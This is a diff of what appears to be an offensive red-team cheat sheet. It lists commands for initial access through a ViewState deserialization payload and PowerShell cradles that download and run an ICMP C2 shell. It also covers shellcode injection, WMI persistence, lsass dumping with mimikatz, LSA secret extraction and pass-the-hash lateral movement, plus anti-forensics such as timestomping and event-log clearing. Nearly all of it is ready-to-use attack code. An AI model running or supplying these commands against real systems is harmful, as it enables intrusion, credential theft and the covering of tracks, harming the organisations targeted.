@@ -80,7 +80,7 @@ CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -
 # reverse shell
 proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
 
-# on penetration from icmp c2
+# on penetration
 Survey 
 InstallWMIPersistence <EventFilterName> <EventConsumerName>
 SetFallbackNetwork <PAddress> <subnetMask>
@@ -106,6 +106,7 @@ Get-Hash
 # lsass mini-dump for NTLM or plaintext
 invoke_file /tmp/Out-Minidump.ps1
 Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
+TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
 download c:\temp\lsass_<PID>.dmp 
 SecureDelete c:\temp\lsass_<PID>.dmp 
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -114,15 +115,6 @@ mimikatz # sekurlsa::logonPasswords full
 # lsa secrets for NTLM
 invoke_file /tmp/Invoke-PowerDump.ps1
 Invoke-PowerDump
-
-# post exploitation
-proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;
-Bypass-4MSI
-proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
-proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
-proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
-proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
-proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
 
 # clear logs
 foreach($log in (get-eventlog -list|foreach-object {$_.log})){
@@ -157,7 +149,7 @@ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE>
 
 ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
 
-# exploitation example
+# initial access
 curl -sv 'http://<URL>/Content/default.aspx' \  
   -H 'Connection: keep-alive' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
@@ -165,5 +157,82 @@ curl -sv 'http://<URL>/Content/default.aspx' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
+
+# on penetration
+Survey 
+InstallWMIPersistence <EventFilterName> <EventConsumerName>
+SetFallbackNetwork <PAddress> <subnetMask>
+invoke_file /tmp/socks_proxy_server.ps1
+iex(new-object net.webclient).downloadstring('<URL>socks_proxy_server.ps1')
+
+# edit proxychains.conf
+socks4 <IP> <PORT>
+
+# maintaining access from icmp c2, migrate to explorer etc..
+InstallPersistence 1
+InstallPersistence 2
+InstallPersistence 3
+GetProcess
+invoke_file /tmp/InjectShellcode.ps1
+msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
+Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
+
+# downgrade for DES hash, crack DES for NTLM
+invoke_file /tmp/Get-Hash.ps1
+Get-Hash
+
+# lsass mini-dump for NTLM or plaintext
+invoke_file /tmp/Out-Minidump.ps1
+Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
+TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
+download c:\temp\lsass_<PID>.dmp 
+SecureDelete c:\temp\lsass_<PID>.dmp 
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords full
+
+# lsa secrets for NTLM
+invoke_file /tmp/Invoke-PowerDump.ps1
+Invoke-PowerDump
+
+# clear logs
+foreach($log in (get-eventlog -list|foreach-object {$_.log})){
+	clear-eventlog -logname $_;
+}
+```
+
+###### LATERAL MOVEMENT
+```txt
+# ongoing access
+proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
+proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
+proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
+
+# enumeration domain via host
+invoke_file /tmp/Sharphound.ps1
+Invoke-BloodHound -CollectionMethod DCOnly --NoSaveCache --RandomFilenames --EncryptZip
+TimeStomp c:\temp\<BLOODHOUND>.zip "01/03/2008 12:12 pm"
+download c:\temp\<BLOODHOUND>.zip
+SecureDelete c:\temp\<BLOODHOUND>.zip
+
+# enumeration domain via proxy
+proxychains bloodhound-python -c DCOnly -u <USERNAME>@<DOMAIN> --hashes <HASHES> -dc <DCIP> -gc <GCIP> -d <DOMAIN> -v;
+proxychains pywerview.py get-netuser -w <DOMAIN> -u <USER> --hashes <HASHES> -t <DOMAIN> -d <DOMAIN>
+proxychains pywerview.py get-netcomputer -w <DOMAIN> -u <USER> --hashes <HASHES> --full-data --ping -t <DOMAIN> -d <DOMAIN>
+proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USER>
+proxychains rpcdump.py -port 135 <TARGETDC>|grep "MS-RPRN";
+
+# host discovery 
+proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
+
+# fingerprinting services
+proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA NETWORK_service_fiingerprint_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
+proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_header_scan -iL <IPLIST>
+
+# fingerprinting services intrusive/loud
+proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
 
 ```
